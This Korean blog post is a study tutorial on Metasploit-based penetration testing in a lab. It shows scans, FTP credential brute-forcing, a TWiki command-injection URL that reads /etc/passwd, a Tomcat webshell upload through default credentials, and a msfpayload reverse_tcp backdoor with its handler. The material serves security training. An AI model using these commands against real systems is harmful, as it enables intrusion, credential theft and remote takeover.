---
title: "Kali_Linux: 취약점 진단 단계 "
last_modified_at: 2020-11-07T00:26:02-05:00
categories:
  - Cryptography
tags:
  - 칼리리눅스
  - 모의침투
  - 모의해킹
toc: true 
toc_label: "Table of Contents"
toc_icon: "cog"
toc_sticky: true 
author_profile: true 
read_time: false 
---

`칼리 리눅스와 백트랙을 활용한 모의 해킹 교재의 일부를 참고하여 공부한 내용입니다`

---
## 취약점 진단 단계
---

* **취약점 진단 단계**는 지금까지 획득한 정보를 이용해 다양한 기법으로 침투를 시도하는 단계다.  
* **메타스플로잇**은 종합 진단 도구 프레임 워크다.
	* 애플리케이션별 취약점 코드를 포함하고 있어 최신 취약점 진단 업무에 활용하는 프레임워크
	* MSF(MetaSploit Framework) 오픈소스 도구, 공격 코드, 페이로드, 인코더, 정찰 도구, 보안 테스팅 제공
	* 광범위한 영역의 정보 탐색, 공격, 사전 침투에 관련된 보안 툴의 설계와 개발 능력 제공
{: .notice--info}

---
### 메타스플로잇
---

* 메타스플로잇의 구성
* msfconsole 입력하여 콘솔로 실행
* MSFpayload: 다른 프레임워크의 익스플로잇과 실행가능한 파일, 셸코드 등을 만들 수 있게 도와준다
* MSFencode: 안티바이러스나 IDS, bad characters(null문자들)를 피할 수 있게 해준다. 
* Auxilliary: 익스플로잇이 포함되어있는것은 아니지만 정보 획득을 위한 http, snmp, ssh, ftp 등 fuzzer, Dos 등 기능을 포함 시켰다.
	* 개인적으로는 Scanner 기능을 많이 사용하였다.
{: .notice}

메타스플로잇에서 다음과 같이 서비스 검색을 할 수 있다. 참고로, GUI 버전인 zenmap도 활용할 수 있다.
{: .notice}

---
#### db_namp
---

```
Db에 저장하기 위해
msf5 > db_nmap -sT -sV -p 1-1023 -O 192.168.0.174
msf5 > db_nmap -sU -sV -p 1-1023 -O 192.168.0.174

한번씩 실행하자 그리고 나서 db_services를 실행하면 이렇게 기록이 저장된다.
msf5 > db_services
[-] The db_services command is DEPRECATED
[-] Use services instead
Services
========

host           port  proto  name          state    info
----           ----  -----  ----          -----    ----
192.168.0.174  21    tcp    ftp           open     Microsoft ftpd 5.0
192.168.0.174  42    tcp    wins          open     Microsoft Windows Wins
192.168.0.174  42    udp    nameserver    unknown
192.168.0.174  53    tcp    domain        open
192.168.0.174  53    udp    domain        open     generic dns response: SERVFAIL
192.168.0.174  67    udp    dhcps         unknown
192.168.0.174  68    udp    dhcpc         unknown
192.168.0.174  80    tcp    http          open     Microsoft IIS httpd 5.0
192.168.0.174  135   tcp    msrpc         open     Microsoft Windows RPC
192.168.0.174  135   udp    msrpc         open
192.168.0.174  137   udp    netbios-ns    open     Microsoft Windows netbios-ssn workgroup: WORKGROUP
192.168.0.174  138   udp    netbios-dgm   unknown
192.168.0.174  139   tcp    netbios-ssn   open     Microsoft Windows netbios-ssn
192.168.0.174  443   tcp    https         open
192.168.0.174  445   tcp    microsoft-ds  open     Microsoft Windows 2000 microsoft-ds
192.168.0.174  445   udp    microsoft-ds  unknown
192.168.0.174  500   udp    isakmp        unknown
```
```
결과 중 아래와 같이 열린 것을 보면 samba 서버가 취약함을 알 수 있다.
192.168.0.174  138   udp    netbios-dgm   unknown
192.168.0.174  139   tcp    netbios-ssn   open     Microsoft Windows netbios-ssn
192.168.0.174  445   tcp    microsoft-ds  open     Microsoft Windows 2000 microsoft-ds
192.168.0.174  445   udp    microsoft-ds  unknown
192.168.0.174  500   udp    isakmp        unknown
```

zenmap을 통해서 나온 결과를 xml로 저장하고 다시 불러올 수도 있다. 이 부분은 나중에 한번 해보자~~
{: .notice}

---
#### use auxiliary/scanner/
---

그 외에 포트 스캔을 해 볼 수도 있고(책참고)
{: .notice}

```
msf> use auxiliary/scanner/portscan/syn
msf auxiliary(syn) > show options
msf auxiliary(syn) > set PORTS 21,22,23,80,8080,888
msf auxiliary(syn) > set RHOSTS 192.168.220.145
msf auxiliary(syn) > run
```

그 외, 다양한 스캔을 해볼 수 있다. (직접 실습한 부분)
{: .notice}

```
msf5 > use auxiliary/scanner/smb/smb_enumusers
msf5 auxiliary(scanner/smb/smb_enumusers) > set rhosts 192.168.0.174
rhosts => 192.168.0.174
msf5 auxiliary(scanner/smb/smb_enumusers) > set threads 256
threads => 256
msf5 auxiliary(scanner/smb/smb_enumusers) > run

결과

[+] 192.168.0.174:445     - W2K-14 [ Administrator, Guest, IUSR_W2K, IWAM_W2K, NetShowServices, TsInternetUser ] ( LockoutTries=0 PasswordMin=0 ) //계정 잠금 정책이 없다
[*] 192.168.0.174:        - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Brute Force 공격했던 부분 
{: .notice}

```
msf5 > use auxiliary/scanner/ftp/ftp_login
msf5 auxiliary(scanner/ftp/ftp_login) >
msf5 auxiliary(scanner/ftp/ftp_login) >
msf5 auxiliary(scanner/ftp/ftp_login) > set rhosts 192.168.0.144
rhosts => 192.168.0.144
msf5 auxiliary(scanner/ftp/ftp_login) > set user_file ~/users.txt
user_file => ~/users.txt
msf5 auxiliary(scanner/ftp/ftp_login) > set pass_file ~/passwords.txt
pass_file => ~/passwords.txt
msf5 auxiliary(scanner/ftp/ftp_login) > set stop_on_success false
stop_on_success => false
msf5 auxiliary(scanner/ftp/ftp_login) > set threads 256
threads => 256
msf5 auxiliary(scanner/ftp/ftp_login) > run


확인하는 법은
Use auxiliary/scanner/ssh/ssh_login
Creds 192.168.0.144
msf5 auxiliary(scanner/ftp/ftp_login) > use auxiliary/scanner/ssh/ssh_login
msf5 auxiliary(scanner/ssh/ssh_login) > creds 192.168.0.144
Credentials
===========

host           origin         service       public  private  realm  private_type  JtR Format
----           ------         -------       ------  -------  -----  ------------  ----------
192.168.0.144  192.168.0.144  21/tcp (ftp)  user1   4545            Password    
192.168.0.144  192.168.0.144  21/tcp (ftp)  admin1  6789            Password
```

---
### 시나리오 공격 1 (twiki 대상 웹 서비스 공격)
---

시나리오 기반으로 생각을 해보자.
{: .notice--info}

nmap 포트 스캔을 통해 오픈 포트와 관련 서비스, 버전 정보를 획득한다.
{: .notice--success}

80/TCP 포트를 확인하고 웹서비스에 접근해본다.
{: .notice--success}

웹 서비스의 디렉터리 정보 확인을 위해 DirBuster 도구를 사용한다.    
디렉터리 정보가 취약하게 보인다고 가정한다.  
{: .notice--success}

도출된 디렉터리 중에서 하나를 선택하여 접근해보자.   
192.168.245.150/tiwiki  
{: .notice--success}

도출된 twiki 웹 서비스를 대상으로 취약점 테스트를 진행한다.
{: .notice--success}

www.exploit-db.com에서 검색을 해본다.
{: .notice--success}

sort_mode 변수 값을 처리하는 과정에서 에러가 발생하여 DB 정보가 노출 된다.  
적용하기 위한 방법을 목록에서 선택하여 적용  
{: .notice--success}

MySQL 관련 계정 정보 노출 확인
{: .notice--success}

원격에서 데이터베이스 접속 시도  
실제로는 방화벽에서 포트 제한을 하고 있어서 접속될 확률이 적다.  
내부 네트워크 대역이라고 가정하자.  
{: .notice--success}

데이터베이스에 접속하여 user 정보가 들어간 테이블을 조회한다.
{: .notice--success}

admin 계정 정보를 확인한다.  
tiwiki 웹 서비스 관리자 계정임을 확인.
서비스 관리자 권한 획득!
{: .notice--success}

웹 서비스에서 사용자들 정보가 들어간 링크를 찾아 들어가본다.
{: .notice--success}

exploitdb에서 찾아본 결과  
링크에서 사용하는 파라매터 값을 이용하여 less /etc/passwd 명령어를 실행할 수 있다.  
http://www.example.com/cgi-bin/view/Main/TwikiUsers?rev=2%20%7Cless%20/etc/passwd  
{: .notice--success}

시스템 패스워드 정보가 노출 되었다!  
{: .notice--success}

ls 명령어를 원격에서 실행해 시스템의 디렉터리 정보를 확인할 수 있다.
http://www.example.com/cgi-bin/view/Main/TwikiUsers?rev=2%20%7Cls   
단, 권한이 없는 명령어는 출력이 안됨  
{: .notice--success}

서버의 셸 권한을 획득하기 위해 search 명령으로 tiwiki 관련 정보가 포함된 공격을 찾아보고 
'tiwiki_graph_formula_exec'를 실행해본다.
{: .notice--success}

페이로드는 bind_tcp로 나머지는 RHOST(상대 IP), RPORT(상대 포트) 설정 후 exploit
{: .notice--success}

서버의 셸 권한 획득!
{: .notice--success}

---
### 시나리오 공격 2 (톰캣 취약점 공격)
---

nmap 포트 스캔을 통해 오픈 포트와 관련 서비스, 버전 정보를 획득한다.
{: .notice--success}

8180/TCP 포트를에 톰캣 서비스가 작동 중인 것을 확인하고 접근해본다.
{: .notice--success}

톰캣 V5라고 가정했을때, 관리자 페이지 접근이 가능하다.  
http://192.168.0.114:8180/manager/html  
{: .notice--success}

톰캣 기본 관리자 페이지에서 기본으로 사용되는 취약한 계정을 알아내는 스캔도구를 사용한다.  
use auxiliary/scanner/http/tomcat_mgr_login  
RHOST, RPORT 설정 후 실행
{: .notice--success}

tomcat/tomcat 임을 알아냄
{: .notice--success}

관리자 페이지에 접속
{: .notice--success}

war파일을 업로드 하는 기능이 있음, 파일 업로드 취약점 사용 
또는 exploit/multi/http/tomcat_mgr_deploy를 사용할 수 있음  
{: .notice--success}

웹셸을 수집하여 jar 명령어로 war 압축파일을 생성한 후 웹셸 업로드
{: .notice--success}

웹셸 파일이 압축 해제되어 폴더에 저장되고 경로로 접근하면 웹에서 실행된다.
{: .notice--success}

서버 침투 성공
{: .notice--success}

---
#### 대응방안
---

오픈소스를 사용 중인 시스템이나 운영 중인 WAS에 대해서는 정기적으로 취약점 공개에 대한 관심을 가져야하고 
업데이트를 유지해야한다.
{: .notice}

---
### 메터프리터 기능을 활용
---

메타프리터는 루비 기반의 스크립트로 작성됐으며 취약점을 이용해 대상 서버에 침투한 후 간단한 명령을 이용해 시스템 
정보들을 획득할 수 있는 기능이다.
{: .notice}

---
#### 리소스 파일로 시스템 침투 환경 만들기(백도어)
---

메타프리터를 활용하기 위해서는 시스템 침투가 먼저다. 이를 위해서 백도어를 활용해보자.
{: .notice}

* 백도어 악성 파일을 이용해 공격을 수행하려면 악성 코드를 생성해야한다.
* 공격자 PC에서 핸들러를 생성해 사용자 PC가 악성 코드를 클릭하길 기다려야한다.
	* payload 선택, Option 설정, Exploit 실행을 해야하는데 msfconsole -r 옵션을 사용하여 리소스 파일을 사용할 수도 있다.
{: .notice--info}

```
#핸들러를 생성하는 명령 입력 순서
#cat reverse_resource.rc
use exploit/multi/handler
set PATLOAD windows/meterpreter/reverse_tcp #상대방이 공격 서버에 접급했을 경우 공격 진행
set LHOST 192.168.0.114
set ExitSession false
exploit -j -z
```

콘솔 창을 하나 더 열어 msfpayload를 이용해 리버스 커넥션을 이용한 간단한 악성 코드를 생성한다.
{: .notice}

```
msfpayload windows/meterpreter/reverse_tcp LHOST=공격자 IP X > reverse_test.exe
```

생성한 exe 파일을 대상 PC에서 실행하면 공격자 PC는 대상 PC에 침투한 것과 동일한 환경이 된다.
{: .notice}

```
msfconsole -r reverse_resource.rc
```

즉, 공격자 측에서는 리소스 파일과 공격 코드(exe)을 생성하고 exe 파일을 상대 PC에 복사해놓는다.
그리고 리소스 파일을 실행한다. 그러면 대기 상태가 되는데, 그 상태에서 상대 PC에서 공격 코드를 실행하기를 기다린다.
상대 PC가 공격 코드를 실행하면 세션이 맺어 지면서 상대방의 콘솔 권한을 제어할 수 있게 된다.
{: .notice--info}

```
#sessions -i ID 입력하여 연결
msf > sessions -i 1
```

---
#### 그 외, 기능
---

* 주요 명령
* 파일 시스템 명령
* 네트워크 명령
* 시스템 명령
* 사용자 인터페이스 명령
* 웹캠 명령
* 권한 상승 명령
* 암호 데이터 베이스 명령
* 타임 스탬프 명령
* 윈도우 정보 수집(winenum)
{: .notice}


---
### Armitage 도구
---

* GUI에 기반한 자동 공격 도구
* 스캔을 통해 적합한 공격을 선택
* 옵션 자동 입력
* MSF 4.6부터는 무료버전에서 지원하지 않는다.
{: .notice}


---
### 패스트 트랙: 자동 공격 도구
---

* 메타스플로잇 모듈을 사용
* Autopwn 공격은 내장된 엔맵 기능으로 네트워크내 대상자 검색, 운영체제, 포트, IP 주소를 분석하고 해당되는 모든 취약점을 자동화 스크립트로 공격한다.
	* 칼리 리눅스에서는 SET에 통합되었다.
	* autopwn을 통해 메타스플로잇 내 모든 페이로드를 이용해 공격 진행 후 취약점 발견시 세션 연결
	* 취약점 미패치를 이용한 접근이라 정기적 패치가 이루어졌다면 문제가 발생하지 않는다.
* MS SQL 인젝터
	* 웹 서비스 권한이 sa(DBMS Admin)으로 설정되어있을 시 SQL 인젝션을 통해 시스템 권한을 획득할 수 있다.
* 패스트 트랙 GUI 도 있다.
	* http://127.0.0.1:44444에 접속
* 패스트 트랙의 대응 방안은 SQL 인젝션 취약점과 동일 하다
	* 입력값 검중
	* 웹 서비스 권한 제한 
{: .notice}

---
### Exploit-DB: 최신 취약점 정보 수집
---
